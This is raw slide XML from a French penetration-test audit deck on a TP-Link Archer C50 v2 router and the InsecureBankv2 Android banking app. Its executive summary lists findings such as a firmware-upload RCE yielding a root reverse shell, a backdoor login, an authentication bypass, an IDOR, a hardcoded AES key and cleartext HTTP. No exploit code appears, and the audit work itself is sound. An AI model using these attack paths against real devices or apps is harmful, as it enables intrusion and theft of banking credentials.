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1F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BB4B45-3DF8-40DE-924A-7D2186F5F93C}" v="452" dt="2026-04-03T12:13:38.020"/>
    <p1510:client id="{4C1CDB81-1D49-6A09-68F5-5B9980ACC167}" v="3" dt="2026-04-03T10:37:45.715"/>
    <p1510:client id="{7E37CC47-65B6-072B-8200-CF7E8CED2EAA}" v="1" dt="2026-04-03T10:43:49.882"/>
    <p1510:client id="{8D4D32B5-108B-2E3B-4E5A-BD976C44FF18}" v="342" dt="2026-04-03T12:06:46.5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27A5FA-7F27-460A-8DA8-890FEB9782C1}" type="datetimeFigureOut">
              <a:t>4/3/2026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B10BDB-2DAC-4B26-A20F-0338D4929AF7}" type="slidenum"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19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0"/>
            <a:ext cx="3383280" cy="5143500"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="132B50"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="132B50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" name="Shape 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5650992" y="0"/>
            <a:ext cx="128016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6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="228600"/>
            <a:ext cx="173736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7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2286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b="1" kern="0" spc="100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D'AUDIT</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof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kern="0" spc="400" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="D4AC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de Sécurité IoT</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1200" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1170432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5200" b="1" noProof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Banking</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="5200" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2212848"/>
            <a:ext cx="2926080" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="3175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1" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="234086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50" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="8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TP-Link Archer C50 v2</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1250" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1250" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="8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InsecureBankv2 Android Application</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1250" noProof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5029200" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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4" name="Text 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3030727"/>
            <a:ext cx="5029200" cy="1106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Commanditaire : Client Banking</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="1000" noProof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Prestataire : Cabinet Cybersécurité</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1000" noProof="0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endParaRPr lang="fr-FR" sz="1000">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40000"/>
                </a:schemeClr>
              </a:solidFill>
              <a:ea typeface="+mn-lt"/>
              <a:cs typeface="+mn-lt"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="accent1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Romain CORDIER – Responsable Firmware</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="accent1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Limane MANE-COLY –  Responsable Support</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR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fr-FR" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="accent1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Paule SAMBA NGANIE – Responsable Mobile</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="fr-FR" sz="1000" b="1">
                <a:solidFill>
                  <a:schemeClr val="accent1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Carlos CANCINO – Responsable Infrastructure</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="fr-FR" sz="1000">
              <a:solidFill>
                <a:schemeClr val="accent1">
                  <a:lumMod val="60000"/>
                  <a:lumOff val="40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943600" y="365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50" b="1" kern="0" spc="200" noProof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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="850" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Shape 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="749808"/>
            <a:ext cx="502920" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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7" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="74980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noProof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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6510528" y="777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>
                <a:solidFill>
                  <a:srgbClr val="8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TP-Link Archer C50 v2</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="1298448"/>
            <a:ext cx="502920" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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0" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="129844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noProof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APK</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6510528" y="13258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>
                <a:solidFill>
                  <a:srgbClr val="8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InsecureBankv2.apk</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="1847088"/>
            <a:ext cx="502920" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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3" name="Text 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="1847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noProof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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="24" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6510528" y="1874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>
                <a:solidFill>
                  <a:srgbClr val="8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REST HTTP</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Shape 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="2395728"/>
            <a:ext cx="502920" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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6" name="Text 24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="239572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noProof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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Text 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6510528" y="24231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>
                <a:solidFill>
                  <a:srgbClr val="8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CVE-2025-15517 (CVSS 8.6)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="28" name="Shape 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="2944368"/>
            <a:ext cx="502920" cy="237744"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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9" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5943600" y="29443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noProof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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Text 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6510528" y="29718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>
                <a:solidFill>
                  <a:srgbClr val="8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12 MB (non officiel)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1000" noProof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4" name="Text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00" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> Audit IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof="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54864"/>
            <a:ext cx="201168" cy="4901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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="137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kern="0" spc="300" noProof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RÉSUMÉ EXÉCUTIF</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="38404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>
                <a:solidFill>
                  <a:srgbClr val="1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Synthèse des risques &amp; recommandations prioritaires</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2200" noProof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8503920" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="10058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Vue d'ensemble </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="199339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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Shape 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="64008" cy="10515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2" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="140817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3200" b="1" noProof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fr-FR" sz="3200" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="19751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Vulnérabilités</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof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fr-FR" sz="95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identifiées</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibr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468880" y="1353312"/>
            <a:ext cx="199339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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15" name="Shape 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2468880" y="1353312"/>
            <a:ext cx="64008" cy="10515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6" name="Text 14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2651760" y="140817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3200" b="1" noProof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fr-FR" sz="3200" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="17" name="Text 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2651760" y="19751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Critiques</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="9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(CVSS ≥ 9.0)</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Shape 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="1353312"/>
            <a:ext cx="199339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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="19" name="Shape 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4617720" y="1353312"/>
            <a:ext cx="64008" cy="10515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0" name="Text 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="140817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3200" b="1" noProof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9.8</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="3200" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="Text 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="19751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max</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="9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 v3.1</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="22" name="Shape 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="1353312"/>
            <a:ext cx="199339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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="23" name="Shape 21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6766560" y="1353312"/>
            <a:ext cx="64008" cy="10515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4" name="Text 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6949440" y="140817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3200" b="1" noProof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30'</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="3200" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="25" name="Text 23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6949440" y="19751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Compromission</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="fr-FR" sz="95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complète</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri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20040" y="253288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>
                <a:solidFill>
                  <a:srgbClr val="1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Constats majeurs</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1200" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="27" name="Shape 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="2862072"/>
            <a:ext cx="749808" cy="2743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8" name="Text 26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="286207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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="29" name="Text 27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="284378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TP-Link Archer C50 v2 : CVE-2025-15517 — Upload RCE sans vérification cryptographique (CVSS 8.6). Reverse shell root obtenu via sysupgrade.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="30" name="Shape 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3246120"/>
            <a:ext cx="749808" cy="2743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1" name="Text 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="324612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fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="32" name="Text 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="322783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InsecureBankv2 : backdoor /devlogin (CVSS 9.8), bypass authentification /changepassword (CVSS 9.1), IDOR virement (CVSS 9.1).</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="33" name="Shape 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="3630168"/>
            <a:ext cx="749808" cy="2743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4" name="Text 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="363016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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="35" name="Text 33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="36118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>
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Clé AES-256 hardcodée + mot de passe en clair dans le binaire APK — déchiffrement immédiat des données.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri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320040" y="4014216"/>
            <a:ext cx="749808" cy="2743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7" name="Text 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="401421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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="38" name="Text 36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="399592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>
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Toutes les communications transitent en HTTP non </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="950">
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>chiffrées</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="950" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> — </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="950">
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Interception</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="950" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1A2540"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> MITM des credentials bancaires.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof="0">
              <a:latin typeface="Calibri"/>
              <a:ea typeface="Calibri"/>
              <a:cs typeface="Calibri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320040" y="4398264"/>
            <a:ext cx="749808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40" name="Text 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="439826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</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="41" name="Text 39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1143000" y="437997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en mode DEBUG, allowBackup=true, activités Android exportées sans authentification — exfiltration via ADB.</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="950" noProof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4" name="Text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00">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Audit</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="fr-FR" sz="700" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="4A6080"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:ea typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t> IoT Banking  |  TP-Link Archer C50 v2 &amp; InsecureBankv2  |  Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="700" noProof="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54864"/>
            <a:ext cx="201168" cy="4901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6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="137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kern="0" spc="300" noProof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PÉRIMÈTRE &amp; MÉTHODOLOGIE</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="900" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="38404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>
                <a:solidFill>
                  <a:srgbClr val="1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Cibles auditées, outils et approche</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="2200" noProof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8503920" cy="0"/>
          </a:xfrm>
          <a:prstGeom prst="line">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="10058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mandaté par le client Banking — Phase statique &amp; dynamique — Avril 2026</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1050" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Shape 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="320040" y="1353312"/>
            <a:ext cx="41605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/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="144475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50" b="1" noProof="0">
                <a:solidFill>
                  <a:srgbClr val="1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Cibles Auditées</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="1250" noProof="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Shape 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1828800"/>
            <a:ext cx="640080" cy="256032"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="1C3A68"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="1C3A68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3" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="502920" y="1828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Routeur</a:t>
            </a:r>
            <a:endParaRPr lang="fr-FR" sz="750" noProof="0"/>
